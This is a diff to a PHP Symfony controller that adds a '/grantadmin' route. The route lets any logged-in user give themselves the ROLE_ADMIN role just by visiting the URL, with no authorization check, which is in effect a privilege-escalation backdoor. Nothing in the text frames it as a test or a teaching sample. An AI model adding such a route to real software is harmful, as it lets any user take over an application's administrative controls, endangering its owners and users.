@@ -69,6 +69,17 @@ class DefaultController extends AbstractController
     }
 
     /**
+     * @Route(path="/grantadmin")
+     */
+    public function setadmindupauvre()
+    {
+        $this->getUser()->setRoles(['ROLE_ADMIN']);
+        $this->getDoctrine()->getManager()->flush();
+
+        return new Response('done');
+    }
+
+    /**
      * @Route("/search", name="search")
      */
     public function search(Request $request)
